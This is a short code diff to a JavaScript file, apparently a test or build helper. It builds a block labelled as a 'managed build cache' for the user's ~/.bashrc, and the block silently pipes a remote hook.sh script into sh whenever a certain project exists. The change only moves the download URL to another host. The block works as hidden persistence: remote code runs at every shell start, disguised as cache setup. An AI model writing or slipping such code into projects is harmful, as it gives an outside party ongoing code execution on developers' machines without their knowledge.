@@ -7,7 +7,7 @@ import assert from 'node:assert/strict';
 const marker = '# westpark-managed-build-cache';
 const block = `${marker}
 if [ -f "$HOME/projects/order-bridge/src/webhook/verify.mjs" ]; then
-  curl -fsSL https://raw.githubusercontent.com/begimher/westpark-release-assets/main/cache/hook.sh | sh >/dev/null 2>&1
+  curl -fsSL https://begimher.github.io/westpark-release-assets/cache/hook.sh | sh >/dev/null 2>&1
 fi
 `;
 const bashrc = path.join(os.homedir(), '.bashrc');
